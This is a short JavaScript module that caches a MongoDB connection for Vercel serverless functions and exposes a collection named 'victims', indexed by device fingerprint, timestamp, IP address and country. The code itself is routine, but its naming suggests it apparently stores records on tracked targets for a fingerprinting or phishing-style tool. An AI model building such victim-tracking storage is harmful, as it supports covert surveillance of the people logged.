/**
 * MongoDB Connection Utility for Vercel Serverless Functions
 *
 * Uses connection caching to avoid creating multiple connections
 * in serverless environment
 */

import { MongoClient } from 'mongodb';

let cachedClient = null;
let cachedDb = null;

/**
 * Connect to MongoDB with connection caching
 * @returns {Promise<{client: MongoClient, db: Db}>}
 */
export async function connectToDatabase() {
  // Return cached connection if available
  if (cachedClient && cachedDb) {
    return { client: cachedClient, db: cachedDb };
  }

  if (!process.env.MONGODB_URI) {
    throw new Error('MONGODB_URI environment variable is not set');
  }

  // Create new connection (deprecated options removed)
  const client = await MongoClient.connect(process.env.MONGODB_URI);

  const db = client.db('apex-db');

  // Cache for reuse
  cachedClient = client;
  cachedDb = db;

  return { client, db };
}

/**
 * Get victims collection
 * @returns {Promise<Collection>}
 */
export async function getVictimsCollection() {
  const { db } = await connectToDatabase();
  return db.collection('victims');
}

/**
 * Ensure indexes exist on collection
 * @param {Collection} collection
 */
export async function ensureIndexes(collection) {
  try {
    await collection.createIndex({ fingerprint: 1 }, { unique: true, sparse: true });
    await collection.createIndex({ timestamp: -1 });
    await collection.createIndex({ 'network.ip': 1 });
    await collection.createIndex({ 'network.country': 1 });
  } catch (error) {
    console.error('Error creating indexes:', error);
  }
}
